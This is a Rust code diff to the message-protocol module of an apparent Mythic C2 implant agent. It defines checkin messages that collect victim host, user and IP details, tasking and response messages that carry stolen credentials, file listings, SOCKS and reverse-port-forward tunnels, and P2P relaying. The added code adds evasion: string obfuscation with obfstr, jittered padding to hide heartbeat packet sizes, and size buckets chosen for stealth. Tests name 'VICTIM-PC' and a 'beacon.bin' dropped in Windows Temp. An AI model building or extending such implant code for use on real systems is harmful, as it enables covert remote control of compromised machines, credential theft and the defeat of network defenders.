@@ -3,36 +3,68 @@ extern crate alloc;
 use alloc::string::String;
 use alloc::vec::Vec;
 use serde::{Deserialize, Serialize};
+pub use crate::buffer::StackVec;
 
 // ==========================================
-// 1. 协议解析与状态错误代号 (Protocol Status Codes)
+// 1. 继承与重导出 crate 根命名空间生效配置、常量与预算类型
+// ==========================================
+pub use crate::{
+    ActiveBudget, ActiveStackWorkspace, DefaultStackWorkspace,
+    BUFFER_SIZE, ACTIVE_WIRE_SIZE, B64Buffer, RawBuffer,
+    Budget16K, Budget4K, Budget64K,
+    StackWorkspace16K, StackWorkspace4K, StackWorkspace64K,
+    CIPHERTEXT_LEN_16K, CIPHERTEXT_LEN_4K, CIPHERTEXT_LEN_64K,
+    MAX_B64_LEN, MAX_CIPHERTEXT_LEN, MAX_PLAINTEXT_LEN, MAX_RAW_LEN, MAX_RAW_READ,
+    PLAINTEXT_LEN_16K, PLAINTEXT_LEN_4K, PLAINTEXT_LEN_64K,
+    PROTOCOL_OVERHEAD,
+    RAW_LEN_16K, RAW_LEN_4K, RAW_LEN_64K,
+    RAW_READ_16K, RAW_READ_4K, RAW_READ_64K,
+    WIRE_SIZE_16K, WIRE_SIZE_4K, WIRE_SIZE_64K,
+};
+
+// ==========================================
+// 5. 动态分片编码与多桶调度 (Multi-Bucket Morphing)
 // ==========================================
 
-/// Mythic 协议解析与数据校验错误代号
-/// 
-/// 遵循单字节 `#[repr(u8)]` 内存布局，零堆分配，适合嵌入式及 Windows 内核对抗 OPSEC 环境
-#[repr(u8)]
+/// 传输桶档位 (Multi-Bucket Morphing)
 #[derive(PartialEq, Eq, Clone, Copy)]
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
-pub enum ModelError {
-    /// 接口动作标志匹配失败或为空
-    InvalidAction = 40,
-    /// C2 服务端返回 status 不为 "success"
-    ResponseStatusError = 41,
-    /// 必填参数缺失或格式长度校验失败 (如 UUID 长度不为 36)
-    MissingRequiredField = 42,
-    /// 文件分片序号、偏移或总片数参数非法
-    InvalidChunkInfo = 43,
-    /// 交互式终端消息类型或编码异常
-    InvalidInteractiveType = 44,
+pub enum DynamicBudget {
+    Small,
+    Medium,
+    Large,
 }
 
-impl ModelError {
+impl DynamicBudget {
+    /// 根据待发载荷大小和隐蔽策略，动态选择规格并返回带 Jitter 的读取尺寸
+    pub fn select_jittered_read(required_raw_len: usize) -> usize {
+        if required_raw_len <= Budget4K::MAX_RAW_READ {
+            Budget4K::jittered_raw_read()
+        } else if required_raw_len <= Budget16K::MAX_RAW_READ {
+            Budget16K::jittered_raw_read()
+        } else {
+            Budget64K::jittered_raw_read()
+        }
+    }
+
+    /// 获取当前档位的目标网络出网包容量
     #[inline(always)]
-    pub const fn code(self) -> u8 {
-        self as u8
+    pub const fn wire_size(self) -> usize {
+        match self {
+            DynamicBudget::Small => Budget4K::MAX_B64_LEN,
+            DynamicBudget::Medium => Budget16K::MAX_B64_LEN,
+            DynamicBudget::Large => Budget64K::MAX_B64_LEN,
+        }
     }
 }
+
+// ==========================================
+// 6. 协议解析与状态错误代号 (Protocol Status Codes)
+// ==========================================
+
+// 统一由 crate::error 收敛导出，保持全局错误代号密码本契约
+pub use crate::error::ModelError;
+
 
 // ==========================================
 // 2. Initial Checkin & Key Exchange (上线注册与密钥协商)
@@ -49,10 +81,7 @@ pub struct CheckinMessage<'a> {
     pub action: &'a str,
     /// 当前 Agent Payload 的初始 UUID (36 字节)
     pub uuid: &'a str,
-    /// 主机 IP 地址 (单个字符切片，如 "192.168.1.100")
-    #[serde(skip_serializing_if = "Option::is_none")]
-    pub ip: Option<&'a str>,
-    /// 主机 IP 地址列表 (支持多网卡枚举)
+    /// 主机 IP 地址列表 (支持多网卡枚举，严格对齐 Mythic 4.0 官方规范 "ips": ["..."])
     #[serde(skip_serializing_if = "Option::is_none")]
     pub ips: Option<&'a [&'a str]>,
     /// 操作系统版本信息 (例如 "Windows 11 Pro 23H2 10.0.22631")
@@ -98,9 +127,10 @@ pub struct CheckinMessage<'a> {
 
 impl<'a> CheckinMessage<'a> {
     #[inline]
+    #[allow(clippy::too_many_arguments)]
     pub fn new(
         uuid: &'a str,
-        ip: &'a str,
+        ips: &'a [&'a str],
         os: &'a str,
         user: &'a str,
         host: &'a str,
@@ -111,8 +141,7 @@ impl<'a> CheckinMessage<'a> {
         Self {
             action: "checkin",
             uuid,
-            ip: Some(ip),
-            ips: None,
+            ips: Some(ips),
             os: Some(os),
             user: Some(user),
             host: Some(host),
@@ -130,13 +159,31 @@ impl<'a> CheckinMessage<'a> {
     }
 
     #[inline]
+    pub fn with_integrity_level(mut self, level: u8) -> Self {
+        self.integrity_level = Some(level);
+        self
+    }
+
+    #[inline]
+    pub fn with_process_name(mut self, process_name: &'a str) -> Self {
+        self.process_name = Some(process_name);
+        self
+    }
+
+    #[inline]
+    pub fn with_extra_info(mut self, extra_info: &'a str) -> Self {
+        self.extra_info = Some(extra_info);
+        self
+    }
+
+    #[inline]
     pub fn with_padding(mut self, padding: Option<&'a str>) -> Self {
         self._p = padding;
         self
     }
 
     pub fn validate(&self) -> Result<(), ModelError> {
-        if self.action != "checkin" {
+        if self.action != obfstr::obfstr!("checkin") {
             return Err(ModelError::InvalidAction);
         }
         if self.uuid.len() != 36 {
@@ -173,10 +220,10 @@ impl<'a> ServerCheckinResponse<'a> {
     }
 
     pub fn validate(&self) -> Result<(), ModelError> {
-        if self.action != "checkin" {
+        if self.action != obfstr::obfstr!("checkin") {
             return Err(ModelError::InvalidAction);
         }
-        if self.status != "success" {
+        if self.status != obfstr::obfstr!("success") {
             return Err(ModelError::ResponseStatusError);
         }
         Ok(())
@@ -240,6 +287,9 @@ pub struct GetTaskingMessage<'a> {
     /// 是否同时获取下挂 P2P 代理节点的任务 (默认 true)
     #[serde(skip_serializing_if = "Option::is_none")]
     pub get_delegate_tasks: Option<bool>,
+    /// 顺风车捎带任务执行回执切片 (Piggybacking responses: 允许在单次心跳中回传结果/分片并拉取新任务)
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub responses: Option<&'a [TaskResponseItem<'a>]>,
     /// P2P 消息中继切片 (可选)
     #[serde(skip_serializing_if = "Option::is_none")]
     pub delegates: Option<&'a [DelegateMessage<'a>]>,
@@ -255,6 +305,9 @@ pub struct GetTaskingMessage<'a> {
     /// 全局系统告警消息切片 (可选)
     #[serde(skip_serializing_if = "Option::is_none")]
     pub alerts: Option<&'a [AlertMsg<'a>]>,
+    /// P2P 路由拓扑连接状态变更切片 (可选)
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub edges: Option<&'a [EdgeMsg<'a>]>,
     /// 动态混淆字段：打破空心跳的恒定包长指纹
     #[serde(skip_serializing_if = "Option::is_none")]
     pub _p: Option<&'a str>,
@@ -267,17 +320,39 @@ impl<'a> Default for GetTaskingMessage<'a> {
             action: "get_tasking",
             tasking_size: 1,
             get_delegate_tasks: None,
+            responses: None,
             delegates: None,
             socks: None,
             rpfwd: None,
             interactive: None,
             alerts: None,
+            edges: None,
             _p: None,
         }
     }
 }
 
 impl<'a> GetTaskingMessage<'a> {
+    #[inline]
+    pub fn new(tasking_size: i32) -> Self {
+        Self {
+            tasking_size,
+            ..Self::default()
+        }
+    }
+
+    #[inline]
+    pub fn with_responses(mut self, responses: &'a [TaskResponseItem<'a>]) -> Self {
+        self.responses = Some(responses);
+        self
+    }
+
+    #[inline]
+    pub fn with_edges(mut self, edges: &'a [EdgeMsg<'a>]) -> Self {
+        self.edges = Some(edges);
+        self
+    }
+
     #[inline]
     pub fn with_padding(mut self, padding: Option<&'a str>) -> Self {
         self._p = padding;
@@ -357,28 +432,35 @@ pub struct MythicTask {
 pub struct ServerTaskingResponseRef<'a> {
     #[serde(borrow)]
     pub action: &'a str,
-    #[serde(borrow)]
-    pub status: &'a str,
-    /// 待执行的任务清单
     #[serde(borrow, default)]
-    pub tasks: Vec<MythicTaskRef<'a>>,
+    pub status: Option<&'a str>,
+    /// 待执行的任务清单 (采用纯栈式 StackVec，零堆分配)
+    #[serde(borrow, default)]
+    pub tasks: StackVec<MythicTaskRef<'a>, 16>,
+    /// 服务端对顺风车捎带 responses 的处理确认回执 (例如返回 file_id 等)
+    #[serde(borrow, default)]
+    pub responses: Option<StackVec<ServerTaskPostResponseItem<'a>, 16>>,
     /// 下发给 P2P 代理节点的消息
     #[serde(borrow, skip_serializing_if = "Option::is_none")]
-    pub delegates: Option<Vec<DelegateMessage<'a>>>,
+    pub delegates: Option<StackVec<DelegateMessage<'a>, 8>>,
     /// 下发给 Agent 的 SOCKS 流量
     #[serde(borrow, skip_serializing_if = "Option::is_none")]
-    pub socks: Option<Vec<SocksMsg<'a>>>,
+    pub socks: Option<StackVec<SocksMsg<'a>, 32>>,
     /// 下发给 Agent 的 RPFWD 流量
     #[serde(borrow, skip_serializing_if = "Option::is_none")]
-    pub rpfwd: Option<Vec<RpfwdMsg<'a>>>,
+    pub rpfwd: Option<StackVec<RpfwdMsg<'a>, 32>>,
     /// 下发给 Agent 的交互式终端输入
     #[serde(borrow, skip_serializing_if = "Option::is_none")]
-    pub interactive: Option<Vec<InteractiveMsg<'a>>>,
+    pub interactive: Option<StackVec<InteractiveMsg<'a>, 16>>,
     #[serde(borrow, skip_serializing_if = "Option::is_none")]
     pub error: Option<&'a str>,
 }
 
 /// 服务端响应 GetTasking 的拥有所有权结构体 (Mythic Server -> Agent)
+///
+/// 注意：该结构体涉及堆分配且不包含多路复用隧道流量 (socks/rpfwd/interactive/delegates)。
+/// 推荐在热点通信路径全面使用零堆分配纯栈式的 [`ServerTaskingResponseRef`]。
+#[deprecated(note = "建议优先使用零堆分配纯栈式 ServerTaskingResponseRef 以规避堆碎片并完整支持隧道多路复用")]
 #[derive(Clone, Serialize, Deserialize, PartialEq)]
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct ServerTaskingResponse {
@@ -450,15 +532,27 @@ impl<'a> PostResponseMessage<'a> {
 }
 
 /// 服务端对 post_response 的确认回执包 (Mythic Server -> Agent)
+///
+/// 严格遵循 Mythic 4.0 官方规范：反序列化 Task ACK 状态以及服务端下发的隧道流量 (socks, rpfwd, interactive)，
+/// 采用零堆分配纯栈式 StackVec 承载。
 #[derive(Clone, Serialize, Deserialize, PartialEq)]
 #[cfg_attr(any(debug_assertions, test), derive(Debug))]
 pub struct ServerPostResponse<'a> {
     #[serde(borrow)]
     pub action: &'a str,
     #[serde(borrow, default)]
-    pub responses: Vec<ServerTaskPostResponseItem<'a>>,
+    pub responses: StackVec<ServerTaskPostResponseItem<'a>, 16>,
     #[serde(borrow, skip_serializing_if = "Option::is_none")]
-    pub delegates: Option<Vec<DelegateMessage<'a>>>,
+    pub delegates: Option<StackVec<DelegateMessage<'a>, 8>>,
+    /// 服务端下发给 Agent 的 SOCKS 代理流量
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
+    pub socks: Option<StackVec<SocksMsg<'a>, 32>>,
+    /// 服务端下发给 Agent 的 RPFWD 流量
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
+    pub rpfwd: Option<StackVec<RpfwdMsg<'a>, 32>>,
+    /// 服务端下发给 Agent 的交互式终端输入
+    #[serde(borrow, skip_serializing_if = "Option::is_none")]
+    pub interactive: Option<StackVec<InteractiveMsg<'a>, 16>>,
 }
 
 /// 服务端对单条 task 回执的处理状态项
@@ -533,6 +627,9 @@ pub struct TaskResponseItem<'a> {
     /// 文件目录结构挂载 (File Browser)
     #[serde(skip_serializing_if = "Option::is_none")]
     pub file_browser: Option<FileBrowserResponse<'a>>,
+    /// 文件删除同步挂载 (File Browser 划线删除)
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub removed_files: Option<&'a [RemovedFileItem<'a>]>,
     /// 凭据发现数据挂载
     #[serde(skip_serializing_if = "Option::is_none")]
     pub credentials: Option<&'a [CredentialItem<'a>]>,
@@ -575,6 +672,18 @@ impl<'a> TaskResponseItem<'a> {
             completed,
             ..Default::default()
         }
+    }
+
+    #[inline]
+    pub fn with_status(mut self, status: &'a str) -> Self {
+        self.status = Some(status);
+        self
+    }
+
+    #[inline]
+    pub fn with_removed_files(mut self, removed_files: &'a [RemovedFileItem<'a>]) -> Self {
+        self.removed_files = Some(removed_files);
+        self
     }
 }
 
@@ -743,7 +852,27 @@ impl<'a> FileChunkPayload<'a> {
     pub fn is_last_chunk(&self) -> bool {
         self.chunk_num == self.total_chunks
     }
+
+    pub fn validate(&self) -> Result<(), ModelError> {
+        if self.action.is_empty() {
+            return Err(ModelError::InvalidAction);
+        }
+        if self.file_id.is_empty() {
+            return Err(ModelError::MissingRequiredField);
+        }
+        if self.chunk_num == 0 || self.chunk_num > self.total_chunks {
+            return Err(ModelError::InvalidChunkInfo);
+        }
+        if self.is_last_chunk() && self.chunk_data.is_empty() && self.total_chunks > 1 {
+            return Err(ModelError::InvalidChunkInfo);
+        }
+        if !self.chunk_data.len().is_multiple_of(4) {
+            return Err(ModelError::InvalidChunkInfo);
+        }
+        Ok(())
+    }
 }
+
 
 // ==========================================
 // 6. Hooking Features: Process Browser (进程树)
@@ -852,6 +981,27 @@ pub struct FileBrowserChildItem<'a> {
     pub access_time: u64,
     pub modify_time: u64,
     pub size: u64,
+}
+
+/// 文件删除同步挂载项 (File Browser 划线删除同步)
+///
+/// 对应官方规范: "removed_files": [ { "host": "...", "path": "..." } ]
+#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
+#[cfg_attr(any(debug_assertions, test), derive(Debug))]
+pub struct RemovedFileItem<'a> {
+    /// 目标主机名称
+    #[serde(borrow)]
+    pub host: &'a str,
+    /// 被删除文件或目录的绝对路径
+    #[serde(borrow)]
+    pub path: &'a str,
+}
+
+impl<'a> RemovedFileItem<'a> {
+    #[inline]
+    pub fn new(host: &'a str, path: &'a str) -> Self {
+        Self { host, path }
+    }
 }
 
 // ==========================================
@@ -1108,9 +1258,10 @@ mod tests {
 
     #[test]
     fn test_checkin_serialization() {
+        let ips = ["192.168.1.50", "10.0.0.5"];
         let msg = CheckinMessage::new(
             "12345678-1234-1234-1234-1234567890ab",
-            "192.168.1.50",
+            &ips,
             "Windows 11 Pro",
             "SYSTEM",
             "VICTIM-PC",
@@ -1123,7 +1274,33 @@ mod tests {
         let json = serde_json::to_string(&msg).unwrap();
         assert!(json.contains(r#""action":"checkin""#));
         assert!(json.contains(r#""user":"SYSTEM""#));
-        assert!(json.contains(r#""192.168.1.50""#));
+        assert!(json.contains(r#""ips":["192.168.1.50","10.0.0.5"]"#));
+        assert!(!json.contains(r#""ip":"#));
+    }
+
+    #[test]
+    fn test_get_tasking_piggybacking() {
+        let resp_item = TaskResponseItem::new("task-001", "whoami completed", true);
+        let resp_slice = [resp_item];
+        let edge = EdgeMsg {
+            source: "node-a",
+            destination: "node-b",
+            action: "add",
+            c2_profile: "smb",
+        };
+        let edges = [edge];
+
+        let msg = GetTaskingMessage::new(1)
+            .with_responses(&resp_slice)
+            .with_edges(&edges);
+
+        let json = serde_json::to_string(&msg).unwrap();
+        assert!(json.contains(r#""action":"get_tasking""#));
+        assert!(json.contains(r#""tasking_size":1"#));
+        assert!(json.contains(r#""responses":[{"#));
+        assert!(json.contains(r#""user_output":"whoami completed""#));
+        assert!(json.contains(r#""edges":[{"#));
+        assert!(json.contains(r#""c2_profile":"smb""#));
     }
 
     #[test]
@@ -1183,9 +1360,13 @@ mod tests {
         };
         let artifacts = [artifact];
 
+        let removed = RemovedFileItem::new("VICTIM-PC", "C:\\Windows\\Temp\\beacon.bin");
+        let removed_files = [removed];
+
         let mut item = TaskResponseItem::new("task-uuid-001", "success output", true);
         item.credentials = Some(&creds);
         item.artifacts = Some(&artifacts);
+        item.removed_files = Some(&removed_files);
 
         let responses = [item];
         let post = PostResponseMessage::new(&responses);
@@ -1193,6 +1374,32 @@ mod tests {
         let json = serde_json::to_string(&post).unwrap();
         assert!(json.contains(r#""action":"post_response""#));
         assert!(json.contains(r#""task_id":"task-uuid-001""#));
+        assert!(json.contains(r#""removed_files":[{"host":"VICTIM-PC","path":"C:\\Windows\\Temp\\beacon.bin"}]"#));
+
+        // 测试 ServerPostResponse 反序列化及隧道流量
+        let server_post_raw = r#"{
+            "action": "post_response",
+            "responses": [
+                {
+                    "task_id": "task-uuid-001",
+                    "status": "success"
+                }
+            ],
+            "socks": [
+                {
+                    "exit": false,
+                    "server_id": 42,
+                    "data": "QUJD"
+                }
+            ]
+        }"#;
+        let server_resp: ServerPostResponse<'_> = serde_json::from_str(server_post_raw).unwrap();
+        assert_eq!(server_resp.action, "post_response");
+        assert_eq!(server_resp.responses.len(), 1);
+        assert_eq!(server_resp.responses[0].task_id, "task-uuid-001");
+        assert!(server_resp.socks.is_some());
+        assert_eq!(server_resp.socks.as_ref().unwrap().len(), 1);
+        assert_eq!(server_resp.socks.as_ref().unwrap()[0].server_id, 42);
     }
 
     #[test]
@@ -1224,5 +1431,59 @@ mod tests {
         let post = PostResponseMessage::new(&resp_item).with_padding(Some("jitter_abc"));
         let json_post = serde_json::to_string(&post).unwrap();
         assert!(json_post.contains(r#""_p":"jitter_abc""#));
+    }
+
+    #[test]
+    fn test_protocol_budget_constants() {
+        assert_eq!(WIRE_SIZE_4K, 4096);
+        assert_eq!(WIRE_SIZE_16K, 16384);
+        assert_eq!(WIRE_SIZE_64K, 65536);
+
+        assert_eq!(MAX_B64_LEN, ACTIVE_WIRE_SIZE);
+        assert_eq!(MAX_RAW_LEN, crate::calc_raw_len(ACTIVE_WIRE_SIZE));
+        assert_eq!(MAX_PLAINTEXT_LEN, crate::calc_max_plaintext_len(MAX_RAW_LEN));
+        assert_eq!(PROTOCOL_OVERHEAD, 100);
+        assert_eq!(MAX_RAW_LEN * 4 / 3, MAX_B64_LEN);
+
+        assert_eq!(RAW_LEN_4K, 3072);
+        assert_eq!(PLAINTEXT_LEN_4K, 2960);
+        assert_eq!(RAW_READ_4K, 2106);
+
+        assert_eq!(Budget4K::MAX_B64_LEN, 4096);
+        assert_eq!(Budget4K::MAX_RAW_LEN, 3072);
+        assert_eq!(Budget4K::MAX_PLAINTEXT_LEN, 2960);
+        assert_eq!(Budget4K::MAX_RAW_READ, 2106);
+        assert_eq!(Budget4K::MAX_RAW_READ % 3, 0);
+
+        assert_eq!(Budget16K::MAX_B64_LEN, 16384);
+        assert_eq!(Budget16K::MAX_RAW_LEN, 12288);
+        assert_eq!(Budget16K::MAX_PLAINTEXT_LEN, 12176);
+        assert_eq!(Budget16K::MAX_RAW_READ, 9018);
+        assert_eq!(Budget16K::MAX_RAW_READ % 3, 0);
+
+        assert_eq!(Budget64K::MAX_B64_LEN, 65536);
+        assert_eq!(Budget64K::MAX_RAW_LEN, 49152);
+        assert_eq!(Budget64K::MAX_PLAINTEXT_LEN, 49040);
+        assert_eq!(Budget64K::MAX_RAW_READ, 36666);
+        assert_eq!(Budget64K::MAX_RAW_READ % 3, 0);
+
+        assert_eq!(DynamicBudget::Small.wire_size(), 4096);
+        assert_eq!(DynamicBudget::Medium.wire_size(), 16384);
+        assert_eq!(DynamicBudget::Large.wire_size(), 65536);
+
+        let s1 = DynamicBudget::select_jittered_read(1000);
+        assert!(s1 <= Budget4K::MAX_RAW_READ);
+        assert_eq!(s1 % 3, 0);
+
+        let s2 = DynamicBudget::select_jittered_read(5000);
+        assert!(s2 <= Budget16K::MAX_RAW_READ);
+        assert_eq!(s2 % 3, 0);
+
+        let mut ws = StackWorkspace4K::new();
+        ws.raw_buf[0] = 0xDE;
+        ws.b64_buf[0] = 0xAD;
+        ws.zeroize();
+        assert_eq!(ws.raw_buf[0], 0);
+        assert_eq!(ws.b64_buf[0], 0);
     }
 }
